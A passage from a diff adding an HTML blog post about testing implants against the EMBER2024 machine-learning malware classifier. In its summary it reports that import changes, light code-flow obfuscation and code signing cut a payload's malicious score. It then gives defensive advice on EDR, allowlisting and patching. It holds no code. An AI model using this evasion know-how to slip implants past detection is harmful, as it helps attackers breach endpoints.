+                            So far, I have looked at two of the eleven features of EMBER: <code>ImportsInfo</code> and <code>ByteHistogram</code>. There are a fair few more which are worth looking into, and its also useful to reference <a href="https://pre.empt.blog/posts/static-data-exploration/">Static Data Exploration of Malware and Goodware Samples</a> to see what malicious samples look like.
+                        </p>
+
+                        <div class="table-responsive">
+                            <table class="table table-bordered">
+                               <thead>
+                                  <tr>
+                                     <th>Class Name</th>
+                                     <th>Dim Value</th>
+                                  </tr>
+                               </thead>
+                               <tbody>
+                                  <tr>
+                                     <td>ByteEntropyHistogram</td>
+                                     <td>256</td>
+                                  </tr>
+                                  <tr>
+                                     <td>StringExtractor</td>
+                                     <td>177</td>
+                                  </tr>
+                                  <tr>
+                                     <td>SectionInfo</td>
+                                     <td>174</td>
+                                  </tr>
+                                  <tr>
+                                     <td>ExportsInfo</td>
+                                     <td>129</td>
+                                  </tr>
+                                  <tr>
+                                     <td>HeaderFileInfo</td>
+                                     <td>74</td>
+                                  </tr>
+                                  <tr>
+                                     <td>DataDirectories</td>
+                                     <td>34</td>
+                                  </tr>
+                                  <tr>
+                                     <td>RichHeader</td>
+                                     <td>33</td>
+                                  </tr>
+                                  <tr>
+                                     <td>AuthenticodeSignature</td>
+                                     <td>8</td>
+                                  </tr>
+                                  <tr>
+                                     <td>GeneralFileInfo</td>
+                                     <td>7</td>
+                                  </tr>
+                               </tbody>
+                            </table>
+                         </div>
+
+                        <p>
+                            But, to summarise. Imports caused a significant change in the prediction. It started at <code>0.9985</code> and came down to <code>0.4</code> to <code>0.6</code> depending on implementation. This is somewhat okay as it will sit in the realm of unsigned procdump and a signed dbgview.
+                        </p>
+
+                        <img src="https://mez0.cc/static/images/samples-predict-table.png" alt="Samples Predict Table" class="img-fluid my-4">
+
+                        <p>
+                            Then, working in an code around the loading logic brought it down a smidge more. In my attempt, I was lazy and just added some basic argparsing and used that do some slight code flow obfuscation - this brought it to <code>0.35</code> (ish). It would be interesting to see how something                        like the <a href="https://www.shellterproject.com/homepage/">Shellter Project</a> responds to ML predictions due to its PE backdooring capability. Also note, code signing has a huge impact. Looking at <code>vgc</code>, it goes from <code>0.45</code> to <code>0.99</code> purely based on the certificate.
+                        </p>
+
+                        <h2 class="mt-5 mb-3" id="conclusion">Conclusion</h2>
+
+                        <p>
+                            In this blog, I wanted to look at what happens behind the scenes when ML is involved with static detection. For the third time, I have spoken about EMBER and used it to figure out which components of a PE to care about when prepping a payload. By looking at the features extracted, I focused on two of them and got the prediction from <code>0.9</code> down to <code>0.3</code> in this blog, but internally at TrustedSec, this has been coming out at around <code>0.01793385907050369</code>.
+                        </p>
+                        <p>
+                            Remember, this is purely static detection so it does not consider any runtime behaviour. There are a million traps at runtime to consider, but this is not one of those blogs. Also, remember, this is only EMBER2024, an open sourced model. This will likely pale in comparison to internal models at reputable vendors.
+                        </p>
+
+                        <p>
+                            <strong>&lt;ramble&gt;</strong>
+                        </p>
+                        <p>
+                            I do want to note, however, its difficult to talk about this topic without giving bad guys all the information to break ML predictions and burn the world. So, I've tried to keep it somewhat vague but I also think its worth mentioning that if you are reading this as someone trying to protect your networks, this blog is likely more aimed towards the vendors of EDR. With that in mind, ensure you have an EDR and that its working correctly. Don't just install it and assume you're covered. Verify alerts are flowing, confirm telemetry is being stored, and test that your team actually sees and acts on detections. Deploy a competent applocker utility and <em>try</em> to only allow things to run that you approve of. Start in audit mode to understand what's normal in your environment, then move toward enforcement as you gain confidence.
+                        </p>
+                        <p>
+                            Beyond those two basics, remember that endpoint defense should be layered. Keep your endpoints and servers patched on a predictable schedule, review EDR logs centrally instead of letting them sit on the host, and set sensible retention so you can actually investigate an incident when it happens. Don't overlook simple wins like disabling unused services, restricting administrative access, or implementing additional endpoint controls like ASR rules or behavioral detection.
+                        </p>
+                        <p>
+                            Finally, treat your EDR and endpoint security stack as something that requires care and feeding. Detection rules drift out of alignment over time, staff change roles, and attackers adapt. Schedule time to revisit EDR rules, run small tabletop tests with your team, and verify your assumptions about what your EDR is actually catching. Even small, regular check-ups can make the difference between catching something early and only realizing after the damage is done.
+                        </p>
+                        <p>
+                            <strong>&lt;/ramble&gt;</strong>
+                        </p>
+                        <p>
+                            And a final caveat, I do not hold a doctorate in any of this so take my experiments with a grain of salt. I'm extremely certain that someone well trained in this type of work will find many mistakes and misinformation here, but it is what it is.
+                        </p>
+
+                        <img src="https://mez0.cc/static/images/bye.gif" alt="Bye" class="img-fluid my-4">
+                </article>
+            </div>
+
+            <div class="col-lg-2">
+                <div class="toc-container">
+                    <div class="card mb-4">
+                        <div class="card-body">
+                            <h5 class="card-title mb-4">Table of Contents</h5>
+                            <div class="toc"><ul><li class="toc-h2"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#introduction">Introduction</a></li><li class="toc-h2"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#ml-and-malware">ML and Malware</a></li><li class="toc-h3"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#static-&amp;-structural-features">Static &amp; structural features</a></li><li class="toc-h3"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#behavioural-and-dynamic-features">Behavioural and dynamic features</a></li><li class="toc-h2"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#about-ember2024">About EMBER2024</a></li><li class="toc-h3"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#dataset">Dataset</a></li><li class="toc-h3"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#ember-refresher">EMBER Refresher</a></li><li class="toc-h3"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#features">Features</a></li><li class="toc-h2"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#my-approach-to-the-task">My approach to the task</a></li><li class="toc-h2"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#the-template-code-to-increment">The template code to increment</a></li><li class="toc-h2"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#changing-the-code-bit-by-bit">Changing the code bit by bit</a></li><li class="toc-h3"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#imports">Imports</a></li><li class="toc-h3"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#working-the-loading-mechanism-back-in">Working the loading mechanism back in</a></li><li class="toc-h3"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#reevaluating...">Reevaluating...</a></li><li class="toc-h3"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#summarising">Summarising</a></li><li class="toc-h2"><a href="https://mez0.cc/posts/evaluating-implants-with-ember/#conclusion">Conclusion</a></li></ul></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    
+    
+    
+    
+    <!-- Chartkick for bar chart -->
+    
+    
+    
+    
+    
+    
+
+
+</body></html>
